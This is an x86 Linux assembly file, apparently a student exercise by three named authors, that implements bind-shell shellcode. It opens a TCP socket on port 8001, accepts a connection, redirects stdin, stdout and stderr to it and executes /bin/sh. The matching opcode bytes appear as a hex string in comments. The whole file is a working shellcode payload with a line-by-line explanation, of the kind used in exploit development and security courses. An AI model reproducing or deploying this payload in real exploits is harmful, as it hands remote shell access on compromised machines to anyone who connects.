#Julien ROLLET ............................................[14106141]
#Clement RICHET DE FORGES .................................[14107937]
#Victor BUSA ..............................................[14107023]

.globl main
	.type	main, @function

#"\x31\xdb\xf7\xe3\xfe\xc3\xb0\x66\x99\x52\x6a\x01\x6a\x02\x89\xe1"
#"\xcd\x80\x89\xc7\x31\xc0\xb0\x66\x43\x52\x66\x68\x1f\x41\x66\x53"
#"\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x01\xdb"
#"\x6a\x05\x57\x89\xe1\xcd\x80\x6a\x66\x58\x43\x52\x52\x57\x89\xe1"
#"\xcd\x80\x89\xc3\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79"
#"\xf9\xeb\x0f\x5e\x31\xc0\x50\x56\x31\xd2\x89\xe1\x89\xf3\xb0\x0b"
#"\xcd\x80\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" 
#"\xf8\x72\x6e\x01";

main:
#socket(AF_INET, SOCK_STREAM, 0);
xor %ebx, %ebx			# clear ebx
mul %ebx			# clear eax
inc %bl				# %ebx = 1 = socket() (bl = lsb of ebx)
movb $0x66, %al 		# socketcall() in %eax, al = lsb of %eax
cdq				# bits of %edx are equal of the mst of %eax
				# i.e here equivalent at mov $0x0, %edx
push %edx			# IPPROTO_IP
push $0x1 			# SOCK_STREAM
push $0x2 			# AF_INET
mov %esp, %ecx			# move pointer to args to ecx
int $0x80 			# call socket()
mov %eax, %edi 			# save socketfd to use it later

#bind(sockfd, (struct sockaddr *) &host_addr, sizeof(struct sockaddr));
#bind(sockfd, {2, 8001, 0}, 16);
xor %eax, %eax
movb $0x66, %al			# socketcall() in %eax
inc %ebx 			# %ebx = 1 so inc bl -> %ebx = 2 = bind()
push %edx			# Construct sockaddr : INADDR_ANY = 0 (%edx = 0)
pushw $0x411f 			# PORT = 8001 (reverse cause 8001d = 0x1f41)
push %bx 			# AF_INET = 2
mov %esp, %ecx			# %ecx point on the struct sockaddr.
push $16 			# sizeof(struct sockaddr)
push %ecx 			# (struct sockaddr *) &host_addr
push %edi 			# sockfd
mov %esp, %ecx			# pointer to args
int $0x80 			# call bind();

#listen(sockfd, 5);
xor %eax, %eax
movb $0x66, %al			# socketcall() in %eax
add %ebx, %ebx 			# %ebx = 4 = listen()
push $0x5 			# queue = 5
push %edi 			# %edi is the sockfd
mov %esp, %ecx 			# pointer to args
int $0x80 			# call listen();


#new_sockfd = accept(sockfd, NULL, NULL);
push $0x66
pop %eax			# socketcall() in %eax
inc %ebx 			# %ebx = 5 = accept()
push %edx 			# 0
push %edx 			# NULL
push %edi 			# sockfd
mov %esp, %ecx 			# pointer to args
int $0x80 			# call accept()

#dup2(socket, i) where i = 0, 1 then 2;
mov %eax, %ebx 			# %ebx is new_sockfd now
xor %eax, %eax			# why do I need this ?
xor %ecx, %ecx
mov $0x2, %cl			# count and %ecx = 2, 1, 0
dup2:
	movb $0x3f, %al	 	# dup2()
	int $0x80 		# call dup2()
	dec %ecx 		# decr %ecx
	jns dup2

#execve("/bin/sh", NULL, NULL);
jmp	jtoc
jtop:
popl	%esi
xorl	%eax,%eax		# Zero %eax
#movb	%al,0x7(%esi)		# NULL terminate /bin/sh
push	%eax			# NULL after pointer below
push	%esi			# Create pointer to array
xorl	%edx, %edx		# NULL in %edx
movl	%esp,%ecx		# Address of array in %ecx
movl	%esi,%ebx		# Address of /bin/sh in %ebx
movb	$0xb,%al		# Set up for execve call in %eax
int	$0x80	

jtoc:
	call	jtop
	.string	"/bin/sh"


#execve("/bin/sh", ["/bin//sh", NULL], NULL);
#mov $11, %eax			#execve
#push %edx			#Null at the end of the string
#push $0x68732f2f		# "//sh"
#push $0x6e69622f		# "/bin"
#mov %esp, %ebx			# address of "/bin//sh\0" in %ebx
#push %edx			# push NULL
#mov %esp, %edx			# tab empty (3)
#push %ebx			# push addess of "/bin//sh"
#mov %esp, %ecx			# argv (2)
#int $0x80
